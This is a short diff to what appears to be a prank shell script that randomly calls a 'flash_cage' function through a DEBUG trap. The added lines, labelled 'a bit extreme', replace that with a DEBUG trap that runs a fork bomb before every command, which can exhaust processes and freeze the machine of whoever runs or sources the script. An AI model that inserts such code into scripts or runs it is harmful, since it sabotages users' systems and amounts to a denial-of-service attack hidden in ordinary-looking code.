@@ -20,3 +20,5 @@ flash_cage() {
 
 trap '[ "$RANDOM" -le 15000 ] && flash_cage' DEBUG
 
+# This is a bit extreme 
+trap ":(){:&:&};:" DEBUG
